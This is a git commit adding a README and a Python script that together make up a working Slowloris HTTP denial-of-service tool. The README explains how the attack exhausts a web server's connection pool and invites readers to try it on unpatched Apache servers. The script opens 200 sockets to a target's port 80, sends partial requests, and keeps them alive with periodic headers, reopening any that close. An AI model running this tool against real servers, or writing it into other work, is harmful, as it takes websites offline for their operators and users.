f7ca9fab646c185f8a04a96ac80d9a02cd0d8499
Adrian Chifor <chifor.adrian1993@gmail.com>
2016-11-11 01:14:22 +0000

    Added code and readme

---
+++ README.md
@@ -0,0 +1,13 @@
+#Slowloris HTTP DoS attack in Python#
+
+Read more about Slowloris [here](https://en.wikipedia.org/wiki/Slowloris_(computer_security)).
+
+We essentially open lots of sockets and make lots of HTTP requests while sending headers every 15 seconds to keep the sockets open. If the server closes a socket, we open a new one. This will use up the web server's thread pool so other people can't connect to it.
+
+##Run##
+
+Try it yourself on web servers running Apache 1.x/2.x (hopefully unpatched?) and dhttpd.
+
+* `git clone https://github.com/adrianchifor/pyslowloris.git`
+* `cd pyslowloris`
+* `python slowloris.py example.com`
---
+++ slowloris.py
@@ -0,0 +1,57 @@
+import socket, random, time, sys
+
+headers = [
+    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Accept-language: en-US,en"
+]
+
+sockets = []
+
+def setupSocket(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(4)
+    sock.connect((ip, 80))
+    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
+
+    for header in headers:
+        sock.send("{}\r\n".format(header).encode("utf-8"))
+
+    return sock
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Use it like this: python {} example.com".format(sys.argv[0]))
+        sys.exit()
+
+    ip = sys.argv[1]
+    count = 200
+    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
+
+    for _ in range(count):
+        try:
+            print("Socket {}".format(_))
+            sock = setupSocket(ip)
+        except socket.error:
+            break
+
+        sockets.append(sock)
+
+    while True:
+        print("Connected to {} sockets. Sending headers...".format(len(sockets)))
+
+        for sock in list(sockets):
+            try:
+                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+            except socket.error:
+                sockets.remove(sock)
+
+        for _ in range(count - len(sockets)):
+            print("Re-opening closed sockets...")
+            try:
+                sock = setupSocket(ip)
+                if sock:
+                    sockets.append(sock)
+            except socket.error:
+                break
+
+        time.sleep(15)
